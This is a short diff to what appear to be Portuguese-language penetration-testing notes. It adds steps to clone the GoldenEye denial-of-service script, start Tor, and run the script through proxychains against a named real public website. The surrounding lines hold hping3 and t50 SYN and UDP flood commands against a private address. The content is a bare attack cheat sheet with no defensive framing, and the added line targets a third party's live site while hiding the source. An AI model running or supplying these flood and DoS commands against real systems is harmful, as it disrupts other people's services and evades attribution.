@@ -541,6 +541,11 @@ Colhendo informações
     hping3 192.168.100.73 --udp --flood --data 150000
     hping3 192.168.100.73 -S --flood -p 80 --rand-source -> atacar na camada de transporte
     t50 192.168.100.73 --flood --syn --dport 80
+    apt install etherape -> motorador de rede
+    git clone https://github.com/jseidl/GoldenEye.git -> script para negação de serviço
+    service start tor
+    proxychains ./goldeneye.py http://www.talismanonlinebrasil.com.br/
+
 
   Google Hacking
     "Intitle"
